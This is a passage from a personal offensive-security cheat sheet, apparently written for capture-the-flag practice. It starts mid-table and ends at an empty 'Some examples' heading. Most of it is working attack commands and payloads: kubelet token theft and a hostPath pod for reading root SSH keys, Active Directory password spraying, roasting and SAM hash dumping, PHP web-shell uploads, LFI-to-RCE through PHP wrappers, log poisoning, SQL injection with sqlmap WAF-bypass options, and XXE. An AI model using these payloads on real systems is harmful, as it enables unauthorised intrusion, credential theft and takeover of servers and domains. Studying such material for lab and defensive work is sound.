| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |

The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.

#### Interaction

- Extract PODS info

  ```bash
   curl https://<IP>:10250/pods -k | jq .
   kubeletctl -i --server <IP> pods
   kubeletctl -i --server <IP> scan rce
  ```

- Execute commands

  ```bash
  kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
  ```

- Gain acces

  ```bash
  # Extract token
  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
  
  # Extract certificate
  kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
  
  # List privileges
  export token=`cat k8.token`
  ubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
  ```

  Given the privileges:

  - **Create**: create a pod &rarr; create a `YAML` file  to create a new container and mount the entire root filesystem

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: privesc
      namespace: default
    spec:
      containers:
      - name: privesc
        image: nginx:1.14.2
        volumeMounts:
        - mountPath: /root
          name: mount-root-into-mnt
      volumes:
      - name: mount-root-into-mnt
        hostPath:
           path: /
      automountServiceAccountToken: true
      hostNetwork: true
    ```

    Create the POD with the file:

    ```bash
    kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
    # Check if running
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
    # Run commands
    kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
    ```

### 9100 - Raw Printing

Raw port 9100 printing, also referred to as JetDirect, AppSocket or PDL-datastream actually **is not a printing protocol by itself**. Instead **all data sent is directly processed by the printing device**, just like a parallel connection over TCP.

**Enumeration**

```bash
nc -vn <IP> 9100
@PJL INFO STATUS      #CODE=40000   DISPLAY="Sleep"   ONLINE=TRUE
@PJL INFO ID          # ID (Brand an version)
@PJL INFO PRODINFO    #Product info
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535  #List dir
@PJL INFO VARIABLES   #Env variales
@PJL INFO FILESYS     #?
@PJL INFO TIMEOUT     #Timeout variables
@PJL RDYMSG           #Ready message
@PJL FSINIT
@PJL FSDIRLIST
@PJL FSUPLOAD         #Useful to upload a file
@PJL FSDOWNLOAD       #Useful to download a file
@PJL FSDELETE         #Useful to delete a file
```



## Active Directory

It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 

The goal is to get local admin on the domain controller. 

Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.

There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 

*Forest* is the parent of a collection of machines that has the same hierarchy.

1. `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]` → Repeat for every domain

   `krbconf()   [DOMAIN] [DC_NETBIOS_NAME]`           → [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)

2. Through anonymous or guest authentication, try to get access to

   - SMB

   - RPC

   - LDAP

3. Get a list of valid usernames:

   - `--users` in nxc for SMB and LDAP while authenticating

   - manually for RPC with `enumdomusers` and `querydispinfo`

   - rid-bruting over SMB

     ```bash
     nxc smb <IP> -u "" -p "" --rid-brute 10000
     ```

   - Kerberos brute-forcing over ldap

     - Generate users: `usergen() [FULL_NAMES.txt]` 

       Wordlists:[Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`

     - ```bash
       kerbrute userenum -d [DOMAIN] [USERS.txt] --dc [DC_IP]
       ```

4. Password spraying

   - Get password policy
     - smb: `nxc --pass-pol`
     - rpc `getdompwinfo`
   - nxc:
     - use `--continue-on-success` 
     - `--no-bruteforce` to try user user
     - test on all services

   

5. Get a session in WinRM

6. If you cannot, Kerberos Roasting: steal an hash

   ```bash
   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
   ```

7. Dump and analyze the database

   ```bash
   neostart   # Open a Neo4J server
   bloodhound # Open the bloodhound GUI 
   bloodhound-python -u user -p pass -ns dc_ip --domain domain -c All --zip --dns-tcp
   ```

8. In bloodhung:

   1. Upload
   2. search for the user you compromised -> right click -> mark as owned
   3. Outbound Object Control: click on everything
   4. On the graph, click on the interessant edges
   5. In Anlysis -> shortest path to High Value Targets




### NXC

Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/

`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`

To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag

To enumerate the users, use the flag `--users` or `--active-users` for ldap.

Possible protocols:

	- ftp
	- smb
	- ssh
	- ldap
	- vnc
	- rdp
	- winrm
	- msSQL

```bash
windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
```

Note that when `(Pwn3d!)` appears, it means that the user has admin access: either the user is in the Administrator group, or that you can easily escalate in AD because of domain-level privileges.

### Hash Dumping

If you have have administrator privileges, you can dump other users passwords hashes:

`reg save hklm\sam sam`

`reg save hklm\system system`

Transfer the file on your device and run `samdump2 [system file] [sam file]`

Also in meterpreter `hashdump` and `lsa_dump` could work.



# Web

## Introduction

### **HTTP Request**

```
[METHOD] /[PATH]?p1=[val1]&p2=[val2] HTTP/[VERSION]`
`Host:  [example.com]`
`[Head1: Val1]`
`...
[PAYLOAD]
```

### **Parameters**

Parameters are very important to spot, and they are grouped in different categories:

- **REFLECTED**: 

  Parameters that are reflected, i.e. they appear in the request and in the response. 

  - Template Injection (SSTI / CSTI)

  - XSS/HTML Injection 

- **FUNCTIONAL**: 

  They have a functional scope (they could be reflected or not).

  - LFI / RFI (file fetching is their function), 

  - SQL injection (query to a database e.g. a search-bar or a login),

  - SSRF (URL fetching), 

  - OS injection (command execution, execute commands on the server).


- **FORMATTED:** 

  Parameters that appear in JSON or XML format

  - SSPP

  - XXE

## Enumeration

### Server Info

- `web_enum [URL]`
- Firefox Extensions:
  - Wappalyzer
  - RetireJS
- Page Content

  - Component Names / Versions

  - Open Source / Well-known Application

  - HTML Source / JS Files Data

### Crawling

- Burpsuite Default Crawler
- `crawl [URL]`
- Alive URLs / Parameters / Forms / User Functionalities
- JS Files
  - Credentials
  - Endpoints
  - Function Calls
  - Hostnames / Usernames

### Discovery

#### FFUF

```bash
GENERAL:
	-X POST -d 'PARAM1=value1&PARAM2=value2'	# POST
	-request req.txt --request-proto http		# From txt

FILTER OPTIONS:
	-fc              # HTTP status codes 
    -fl              # lines in response.
    -fr              # regexp (responde do not contain the words)
    -mr			     # regexp (responde contains the words)
    -fs              # response size. 
    -fw              # amount of words in response.
  
OUTPUT OPTIONS:
	-c				# colored
	-s				# Only results (silent)
```

**REMEMBER TO COPY THE REQUEST EXACTLY!** E.g. from `Burp`

#### VHosts

- Purpose:

  A virtual host is a alternate, parallell hostname for your box that  allows your box to react differently depending on what alternate name  visitors aims at.  

- Types:

  - Name-based: relies solely on the `HTTP Host header` to distinguish between websites.
  - IP-based
  - Port-based

**Fuzzing** `vhost URL` &rarr; Do it recursively!

Add found subdomains to `/etc/hosts` and scan recursively

#### Directories and files

Fuzzing: `dirfuzz [URL]`

**HTTP status code** 

-  `200`  request was successful
-  `403`  forbidden to access the resource from the origin IP
-  `301`  being redirected (not a failure case)

**IIS file/dir discovery**

- General discovery: 

  `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`

- Shortname scanner (`msfconsole`)

  It returns file/dir name with the wildcards `*` and `*~1`, that have to be fuzzed

- Extensions:

  `/usr/share/wordlists/extension-wordlist/asp.net.txt`

**Important files:**

- `.swp` *swap files:* 

  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.

  - `vim -r [swap file]` to read it
  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable

- `robots.txt`

  It instructs search engine web crawlers bots which resources can and cannot be accessed for indexing. 
  
  `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. 
  
  `Directives`: specific instructions to the user-agent. Common directives:
  
  - `Disallow`
  
    paths that the bot can't crawl.
  
  - `Allow`
  
    Permits the bot to crawl specific paths, even if in`Disallow`.
  
  - `Crawl-delay`
  
    Sets a delay (in sec) between successive requests to avoid overloading
  
  - `Sitemap`
  
    Provides the URL to an XML sitemap for more efficient crawling.
  
- `.well-known`

  It is a standardized directory, typically accessible in `/.well-known/` from the web server , that centralizes a website's critical metadata, including configuration files and information related to its services,  protocols, and security mechanisms. Some common URIs:

  - `security.txt`

    Contains contact information for security researchers to report vulnerabilities.

  - `change-password`

    Provides a standard URL for directing users to a password change page.

  - `openid-configuration`

    Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Interesting for *endpoint discovery*.

  - `assetlinks.json`

    Used for verifying ownership of digital assets (e.g. apps) associated with a domain.

  - `mta-sts.txt`

    Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.
  
- `/.git`

  Hashes of a git folder. To reconstruct it:

  ```bash
  git-dumper [URL] [OUTPUT DIR]
  ```

#### Hidden parameters

1. Check for hidden parameters:

   `paramscan [URL]` 

2. Verify the behaviour with curl

3. Fuzz using `ffuf`: REMEMBER TO COPY THE REQUEST EXACTLY!

```bash
ffuf -X POST -d 'PARAM1=value1&PARAM2=value2'		#same as curl
```

There are different types of POST parameters formats, depending on the *content type*:

- `Content-Type: application/x-www-form-urlencoded` &rarr; `-d 'PARAM=value'`
- `Content-Type: application/json` &rarr; `-d "{'PARAM':'value'}"`
-  `Content-type: multipart/form-data`

### Common Application

#### Python editor

https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes

#### Amazon Buckets

The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..

Use `awscli` to interact with them. 

To list the buckets:
`aws --endpoint=http://s3.thetoppers.htb s3 ls`

To list the objects inside the buckets just specify the bucket at the end of the previous command:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## Exploitation

### Server-side

**Test Files** to check if the vulnerability is there:

- Linux: `"/etc/passwd"`
- Windows file: `'file"///c:/windows/win.ini'`

#### File Upload

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files)

##### Upload Directory

- Fuzz
- Use other vulnerabilities to find the upload files by reading the web application code (e.g. php filters)
- Force error messages
  - Upload a file with a name that already exists
  - Send two identical requests simultaneously
  - Upload a file with a very long name (e.g., 5,000 characters)
  - Windows specific:
    - Use reserved characters in the file name, such as `|`, `<`, `>`, `*`, or `?`
    - Usereserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`)

##### Allowed file Abuse

- **Configuration Files**

  - [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Apache .htaccess) / [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Busybox httpd.conf)  → Apache

  - [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration IIS web.config)            → ASP.NET

  - [package.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#configuration-files)          → NodeJS Packages

  - [composer.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#configuration-files)         → PHP Packages

  - [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Python __init__.py)

  - [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration uwsgi.ini/uwsgi.ini)

- **SVG**

  Note that sometimes SVG is not uploaded somehwere, but is rendered on the same page in real time. Use `CTRL+SHIFT+C` to see the output of the payload.

  - [SVG Exploitation](https://github.com/allanlw/svg-cheatsheet) → `Content-Type: image/svg+xml`

  - XXE

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "[XXE_PAYLOAD]"> ]>
    <svg>&xxe;</svg>
    ```

  - XSS (you need for somebody to click on the link of the image)

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">[JS_XSS_CODE]</script>
    </svg>
    ```

- **PNG / JPG / DJVU**

  - [ImageMagick 7.0.1-1](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files) / [7.1.0-49 beta](https://github.com/kljunowsky/CVE-2022-44268)

  - [PNG / JPG Compression Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#picture-compression)

  - Metadata Injection: 

    Put a payload in a meta-tag of an image &rarr; [DJVU + EXIFTOOL RCE](https://github.com/LazyTitan33/ExifTool-DjVu-exploit)

    1. For XSS change Content-type: text\html

    2. Change the meta-TAG of an image:

       ```bash
       exiftool -[TAG]="[INJECTION/BACKEND/XSS]" file.png
       ```

       - The TAG can be e.g. `Comment`, `Artist`

- **PDF**

  - [XSS](https://medium.com/@katmaca2014/pdf-upload-leading-to-stored-xss-f712326705ee)

  - Dynamic Rendering → iFrame LFI / SSRF

- XML / HTML / MD / CSS

  - XSS

  - XXE

  - SSRF

  - LFI

  - [Jetty XML RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#jetty-rce)

- **ZIP / TAR / GZ**

  - [Exploitation](https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-archives)

  - [ZIP Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#zip-archive) / RCE

##### Webshell Upload

Bypass Client-Side Validation → Intercept Upload Request → Webshell in Multipart Data → Bypass Type & Extension Filters 

- **Front-end filter**

  - Use Burp, if you don't see the Burp request:

    - `CTRL+SHIFT+C` to toggle the Page Inspector

    - Click on the upload form &rarr; the html code will be highlighted

    - Set: 

      - `method="post"`

      -  `enctype="multipart/form-data"` 

      - `action="/[BACKEND_FILE]"` 

        Guess or fuzz the file that processes the upload

  - Disable front-end validation
    - `CTRL+SHIFT+C` to toggle the Page Inspector
    - Click on the upload form &rarr; the html code will be highlighted
    - `CTRL+SHIFT+K` and type functions to examine the c

- **Back-end Filters**

  - MIME-Type 

    (internet standard that determines the type of a file through its general format and bytes structure), usually done by inspecting the first few bytes of the file.

    With `ffuf` save the first MIME working file, adding a shell after the MIME

    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/mime-bytes.txt -s | head -n 1 > allowed_mime
    ```

  - Content-type: usually you can keep the Content-type of an allowed file

    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/content-types.txt:FUZZTYPE -w allowed_mime:FUZZMIME
    ```

  - Try MIME and Content-type indepentently first, if not with both FUZZ at the same time. Then, extension is always independent:

  - Extension fuzzing (replace `png` with allowed extension)

    - `shell.pngFUZZEXT`
    - `shellFUZZEXT.png`
    - `shellFUZZEXT`

    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/ext_bypass.txt:FUZZEXT -w allowed_mime:FUZZMIME
    ```

  - See which shell worked:

    ```bash
    ffuf -u "http://[URL]/[UPLOADS_FOLDER]/shell.pngFUZZ?cmd=id" -w /usr/share/wordlists/file_upload/ext_bypass.txt -mr "uid" -s
    ```

##### Name Injection

Inject a command in the file name (if the name of the file is reflected or processed in the back-end)

- SQL / XSS / SSTI / SSRF / OS / LFI Injections 

##### Windows File Convention

Use the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist:  they used a Tilde character (`~`) to complete the file name

&rarr; we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file.

#### LFI / RFI

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended, like when an application uses the path to a file as input. 

Path wordlists:

[Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt): `/usr/share/wordlists/LFI/file_inclusion_linux.txt`

- `/etc/passwd`, `/etc/shadow`

- ssh keys

- web applications credentials

  - where does the application save the passwords?

- Opened services

- Web root: 

  `seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`

- [Log files](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

[Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt): `/usr/share/wordlists/LFI/file_inclusion_windows.txt`

- `WINDOWS\System32\drivers\etc\hosts`

-  `C:\Windows\boot.ini`

- Web root:

  `seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`

- [Log files]([wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows))

Both:

- `/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

Tools:

- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
-  [liffy](https://github.com/mzfr/liffy)

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | ---------------- | ----------- | -------------- |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` | ✅                | ✅           | ✅              |
| `require()`/`require_once()` | ✅                | ✅           | ❌              |
| `file_get_contents()`        | ✅                | ❌           | ✅              |
| `fopen()`/`file()`           | ✅                | ❌           | ❌              |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              | ✅                | ❌           | ❌              |
| `fs.sendFile()`              | ✅                | ❌           | ❌              |
| `res.render()`               | ✅                | ✅           | ❌              |
| **Java**                     |                  |             |                |
| `include`                    | ✅                | ❌           | ❌              |
| `import`                     | ✅                | ✅           | ✅              |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            | ✅                | ❌           | ❌              |
| `@Html.RemotePartial()`      | ✅                | ❌           | ✅              |
| `Response.WriteFile()`       | ✅                | ❌           | ❌              |
| `include`                    | ✅                | ✅           | ✅              |

##### **Exploit:**

- **Path Traversal**

  `../../../../../etc/passwd`

  - Prefix: `/`

  - Suffix: 

  - Bypasses: 

    - `....//` `..././` `....\/` `....////`
    - URL Encoding
    - Fuzz approved path: `./[FUZZ]/../../../../../etc/passwd`
    - Only some extensions are readable.

  -  PHP version < 5.4

     - Path truncation: Reaching the 4096 character limitation, the appended extension (`.php`) would be truncated:

       ```bash
       echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
       ```

     - Null byte injection: add a null byte (`%00`) at the end

- **Source Code Disclosure (PHP)**

  - When a parameters allow you to execute a php file, you can use it to display the source code by using a PHP filter

    ```
    php://filter/read=convert.base64-encode/resource=[FILE_TO_READ]
    ```

- **PHP code execution**

  - Check if `allow_url_include` is enabled or `expect` extension in installed

    - Apache: `/etc/php/[PHP VERSION]/apache2/php.ini`
    - Nginx: `/etc/php/[PHP VERSION]/fpm/php.ini`

  - If `allow_url_include`:

    - *Data* wrapper: includes code using PHP web shell encoded in base64

      ```bash
      curl -s 'http://<URL>?PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
      ```

    - *Input* wrapper: external input as POST parameter

      ```bash
      curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<URL>?[PARAM]=php://input&cmd=id"
      ```

  - If `expect` is installed:

    - *Expect* wrapper: run commands in URL 

      ```bash
      curl -s "http://<URL>/?[PARAM]=expect://id"
      ```

  - If `zip wrapper` is enabled and **images** can be uploaded:

    1. Create and zip a web shell

       ```bash
       echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
       ```

    2. Upload `shell.jpg`

    3. Include it using the zip wrapper (check upload location)

       ```
       zip://[PATH]/shell.jpg%23shell.php&cmd=id
       ```

       `%23` is `#` in URL encoding

  - if `phar` is enabled and **images** can be uploaded:

    1. Create a shell.php file

       ```php
       <?php
       $phar = new Phar('shell.phar');
       $phar->startBuffering();
       $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
       $phar->setStub('<?php __HALT_COMPILER(); ?>');
       
       $phar->stopBuffering();
       ```

    2. Compile it in a phar file

       ```bash
       php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
       ```

    3. Upload shell.jpg (check upload location)

    4. Include it with phar wrapper

       ```
       phar://[PATH]/shell.jpg%2Fshell.txt&cmd=id
       ```

- **RFI**:

  To verify, try to include a URL (first a local one, but not the vulnerable page itself, since it could cause a loop), and see if we can get its content.

  `allow_url_include` has to be enabled, apart from SMB.

  1. Write a script in the language of the web application

  2. Host and include the script

     - http:

       ```bash
       sudo python3 -m http.server <LISTENING_PORT>	# 80 or 443
       ```

     - ftp:

       ```bash
       sudo python -m pyftpdlib -p 21
       ```

     - smb - doesn't require `allow_url_include`:

       ```
       smbserv
       ```

- **Log poisoning:**

  Requires execute privileges.

  Writing PHP code in a field gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.

  - PHP:

    `PHPSESSID` cookies, can hold specific user-related data on the back-end (`/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows).  if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its name would be `sess_el4ukv0kqbvoirg7nkp4dncpk3`

    1. Check if `PHPSESSID` cookie is set

    2. Try to include the `sess_*` file in the vulnerable parameter

    3. Check the `sess_*` file,  do you have control over a specified parameter? If so, try to change it to a string by sending another request, and check again if it changed

    4. Poisoning by writing PHP code into the session file

       ```bash
       http://<SERVER_IP>:<PORT>/index.php?[PARAM]=[SHELL]
       ```

       Don't use a non-permanent web shell, because with each command you would overwrite the `sess_*` file.

    5. Include the `sess_*` file by LFI

  - Apache & Nginx

    1. Look for `access.log` and `error.log` or others and try to read them

       - Apache: `/var/log/apache2/` `C:\xampp\apache\logs\`

       - Nginx: `/var/log/nginx/` `C:\nginx\log\`
       - Others for Linux: 
         - `/proc/self/environ`
         -  `/proc/self/fd/N` files (N is a PID usually between 0-50)
         - `/var/log/sshd.log`
         - `/var/log/mail`
         - `/var/log/vsftpd.log`

    2. Look for parameters (also the header) that you can control &rarr; poison

    3. Web shell in the parameter

  - Open Services

    If the `ssh`, `mail` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into  them and set the username to PHP code, and upon including their logs,  the PHP code would execute.

#### SQL Injections

##### Injection types:

- **Union Based:** 
  - output readable on the front-end
  - specify location (i.e. column)
- **Error Based:** 
  - errors readable on the front-end
- **Boolean Based** (blind)
  - Boolean condition true &rarr; size or status change of HTML request
- **Time Based** (blind)
  - Boolean condition true &rarr; delay response with `Sleep()` &rarr; time change
  - e.g. `AND 1=IF(2>1,SLEEP(5),0)`
- **Stacked Queries**
  -  injecting additional SQL statements after the vulnerable one. 
  - e.g. `; DROP TABLE users`
- **Out of Band:**
  - output in a DNS record

##### Context:

Relational database structure in the back-end (e.g. MySQL). *Relational databases* have data stored in tables and use SQL for queries

- Apache / Nginx &rarr; Problably running on Linux &rarr; likely `MySQL`

  - Identify with:

    - If you have full query output: `SELECT @@version` 

      In MSSQL it returns MSSQL version. Error with other DBMS.

    - Numeric output: `SELECT POW(1,1)`

      Error with other DBMS.

    - Blind: `SELECT SLEEP(5)`

      Will not delay response with other DBMS

  - Use `INFORMATION_SCHEMA` to get the structure of the database

    ```sql
    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
    ```

    ```sql
    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
    ```

    ```sql
    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
    ```

- IIS &rarr; Probably Windows &rarr; likely `MSSQL`

##### sqlmap: 

- [Wiki & Usage](https://github.com/sqlmapproject/sqlmap/wiki/usage) 
- In Net Inspector: `Copy` > `Copy Request Headers`
- `sqlscan <query.txt>`

```bash
#-----------------------------GENERAL----------------------------------

# General query
sqlmap [CURL_QUERY]	/ -r [query.txt] 			# Test all parameters
sqlmap [CURL_QUERY] -p [PARAM_TO_TEST]
sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]

# Header
-H='<HEADER_KEY>: <VALUE>'		# Header specification
--<header_key>='<value>'		# Add * to test for injection

# Good to have
--dump-all --exclude-sysdbs		# Automatically dump all the data
--flush-session --fresh-queries	# Clean prev sessions
--threads 10
-v 3

# DB Enumeration
--smart							# Runs euristics
--schema 						# Table structure
--search [ -T, -C] <string>		# search as LIKE operator in table, col
--dump -D <db> -T <table>		# Dump a table
--passwords						# Find credentials

# Payload tuning
--prefix= / --suffix=			# Boundaries of the payload
--level=<1-5 [d1]> 				# Extends payloads based on success prob
--risk=<1-3 [d1]>				# Extends payloads based on risk

--code=<status_code>			# Filter by status code of success
--titles=<http_title>
--string=<success_string>
--text-only 					# Comparison only on visible content
--technique=BEUSQT

-union-cols=<No.DB columns>		# For UNION Inj
--union-char='a'				# Value of the column (default NULL)
--union-from=<table>			# append in the form FROM <table>	

#-----------------------------BYPASS----------------------------------

# WAF bypass 
--skip-waf						# Skip WAF identification
--random-agent 					# random User-agent 
--mobile 						# Imitate a smartphone  
--tor --check-tor				# Tor proxy: sudo service tor start
--chunked						# Splits POST requests in chunks
--list-tampers					# Determine tamper with ~/TOOLS/ATLAS.py
--tamper=between,space2comment,equaltolike,escapequotes

# Debugging
--parse-errors						# Show DBMS errors
-t /tmp/traffic.txt					# Stores traffic content
--proxy	"http://127.0.0.1:9999"		# redirect to a proxy (Burp)

# Protections Bypass
--csrf-token="<param>"			# Against Cross-Site Request Forgery 
--randomize=<param>				# Param to randomize
--eval=<Py code with param>		# Dinamically computes value of param

#-----------------------------EXPLOIT----------------------------------

# OS File read / write
--is-dba						# Check for r/w privilidges
--file-read "<path>"			# OS file read (saved in a file)

--file-write "<your_local_file>" --file-dest "<remote_path>"

# OS Command execution
--os-shell
```

**Prefix and Suffices:**

```bash
ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.txt:FUZZ1 -w /usr/share/wordlists/sql_suff.txt:FUZZ2
```

- PAYLOAD

  - UNION: `ORDER BY FUZZN` 

    wordlist: `/usr/share/wordlists/numbers1-20.txt:FUZZN`

  - `OR 1=1` (check URL encoding, e.g. substitute ` ` with `+`)

  - Sleep query: 
    - MSSQL: `OR WAITFOR DELAY '0:0:10'`
      - PSQL: `OR SELECT pg_sleep(10)`
      - MYSQL: `OR SELECT sleep(10)`
      - ORACLE: `OR dbms_pipe.receive_message(('a'),10)`

##### WAF Bypass

- See SQLmap WAS Bypass section

- Identify TAMPER:

  - ```bash
    python3 ~/TOOLS/atlas/atlas.py
    ```

- HPP (HTTP parameter pollution): split the payload for GET request

  e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`

##### MYSQL:

- **Login Bypass**

  `random' or 1=1-- -` with `'` `"` `` ` ``

- **Union Injection**

  in SQL merges the columns of two tables (use junk variables to match the number of columns)

   `cn' UNION select 1,@@version,3,4-- `

- **Read / Write Files:**

  - Determine User

    ```sql
    SELECT USER()
    SELECT CURRENT_USER()
    SELECT user from mysql.user
    ```

  - Determine r/w privileges (`FILE` privilege)

    ```sql
    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
    ```

  - Check where to r/w from (empty = anywere; NULL = nowhere)

    ```sql
    SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
    ```

  - Read

    ```sql
    SELECT LOAD_FILE('/etc/passwd');
    ```

    Read the server configuration to discover the **web root** (to upload a shell)

    - Apache: `/etc/apache2/sites-enabled/000-default.conf`

  - Write in the back-end
  
    ```sql
    SELECT * from tabl INTO OUTFILE 'PATH'; 	# From Table
    SELECT 'string' INTO OUTFILE 'PATH';		# From string
    # If used with union do select 1, 2, 'string', ...
    ```
    
    Use `FROM_BASE64("base64_data")` to write long files

#### XXE Injection

*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data. 

*XML Entities* are a way of representing an item of data within an XML
document, instead of using the data itself. E.g., `&lt;` and `&gt;` represent < and > .

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.

Burpsuit responder: 

```php
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
<data>&example;</data>
```

- data: vulnerable parameter, the *reflected* one.

#### OS Injection (command injection)

If in the backend, when you send a request though a parameter, this gets processed through a linux command, it could be vulnerable to executing multiple commands, like `&&` or `;`.

Some examples:

